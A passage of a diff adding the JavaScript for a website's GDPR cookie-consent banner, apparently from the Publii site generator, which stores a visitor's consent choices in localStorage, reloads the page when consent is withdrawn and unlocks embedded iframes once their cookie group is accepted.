+            localStorage.setItem('publii-gdpr-cookies-config-save-date', +new Date());
+        }
+    }
+
+    function getInitialStateOfConsents () {
+        if (!cbUI.popup.element) {
+            return [];
+        }
+
+        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
+        var groups = [];
+
+        for (var i = 0; i < checkedGroups.length; i++) {
+            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');
+
+            if (allowedGroup !== '') {
+                groups.push(allowedGroup);
+            }
+        }
+
+        if (cbConfig.debugMode) {
+            console.log('🍪 Initial state: ' + groups.join(', '));
+        }
+
+        return groups;
+    }
+
+    function getCurrentStateOfConsents () {
+        if (!cbUI.popup.element) {
+            return [];
+        }
+
+        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
+        var groups = [];
+
+        for (var i = 0; i < checkedGroups.length; i++) {
+            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');
+
+            if (allowedGroup !== '') {
+                groups.push(allowedGroup);
+            }
+        }
+
+        if (cbConfig.debugMode) {
+            console.log('🍪 State to save: ' + groups.join(', '));
+        }
+
+        return groups;
+    }
+
+    function getAllGroups () {
+        if (!cbUI.popup.element) {
+            return [];
+        }
+
+        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
+        var groups = [];
+
+        for (var i = 0; i < checkedGroups.length; i++) {
+            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');
+
+            if (allowedGroup !== '') {
+                groups.push(allowedGroup);
+            }
+        }
+
+        return groups;
+    }
+
+    function acceptAllCookies (source) {
+        var groupsToAccept = getAllGroups();
+        storeConfiguration(groupsToAccept);
+
+        for (var i = 0; i < groupsToAccept.length; i++) {
+            var group = groupsToAccept[i];
+
+            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
+                if (cbConfig.debugMode) {
+                    console.log('🍪 Skip previously activated group: ' + group);
+                }
+
+                continue;
+            }
+
+            allowCookieGroup(group);
+        }
+
+        if (cbUI.popup.element) {
+            var checkboxesToCheck = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
+
+            for (var j = 0; j < checkboxesToCheck.length; j++) {
+                checkboxesToCheck[j].checked = true;
+            }
+        }
+
+        if (cbConfig.debugMode) {
+            console.log('🍪 Accept all cookies: ', groupsToAccept.join(', '));
+        }
+
+        if (source === 'popup') {
+            hideAdvancedPopup();
+        } else if (source === 'banner') {
+            hideBanner();
+        }
+    }
+
+    function rejectAllCookies () {
+        if (cbConfig.debugMode) {
+            console.log('🍪 Reject all cookies');
+        }
+
+        storeConfiguration([]);
+        setTimeout(function () {
+            window.location.reload();
+        }, 100);
+    }
+
+    function saveConfiguration () {
+        var groupsToAccept = getCurrentStateOfConsents();
+        storeConfiguration(groupsToAccept);
+
+        if (cbConfig.debugMode) {
+            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
+        }
+
+        if (reloadIsNeeded(groupsToAccept)) {
+            setTimeout(function () {
+                window.location.reload();
+            }, 100);
+            return;
+        }
+
+        for (var i = 0; i < groupsToAccept.length; i++) {
+            var group = groupsToAccept[i];
+
+            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
+                if (cbConfig.debugMode) {
+                    console.log('🍪 Skip previously activated group: ' + group);
+                }
+
+                continue;
+            }
+
+            allowCookieGroup(group);
+        }
+
+        hideAdvancedPopup();
+    }
+
+    function reloadIsNeeded (groupsToAccept) {
+        // check if user rejected consent for initial groups
+        var initialGroups = cbConfig.initialState;
+        var previouslyAcceptedGroups = cbConfig.previouslyAccepted;
+        var groupsToCheck = initialGroups.concat(previouslyAcceptedGroups);
+
+        for (var i = 0; i < groupsToCheck.length; i++) {
+            var groupToCheck = groupsToCheck[i];
+
+            if (groupToCheck !== '' && groupsToAccept.indexOf(groupToCheck) === -1) {
+                if (cbConfig.debugMode) {
+                    console.log('🍪 Reload is needed due lack of: ', groupToCheck);
+                }
+
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    function unlockEmbeds (cookieGroup) {
+        var iframesToUnlock = document.querySelectorAll('.pec-wrapper[data-consent-group-id="' + cookieGroup + '"]');
+
+        for (var i = 0; i < iframesToUnlock.length; i++) {
+            var iframeWrapper = iframesToUnlock[i];
+            iframeWrapper.querySelector('.pec-overlay').classList.remove('is-active');
+            iframeWrapper.querySelector('.pec-overlay').setAttribute('aria-hidden', 'true');
+            var iframe = iframeWrapper.querySelector('iframe');
+            iframe.setAttribute('src', iframe.getAttribute('data-consent-src'));
+        }
+    }
+
+    win.publiiEmbedConsentGiven = function (cookieGroup) {
+        // it will unlock embeds
+        allowCookieGroup(cookieGroup);
+
+        var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + cookieGroup + '"]');
+
+        if (checkbox) {
+            checkbox.checked = true;
+        }
+
+        var groupsToAccept = getCurrentStateOfConsents();
+        storeConfiguration(groupsToAccept);
+
+        if (cbConfig.debugMode) {
+            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
+        }
+    }
+})(window);</script></body></html>
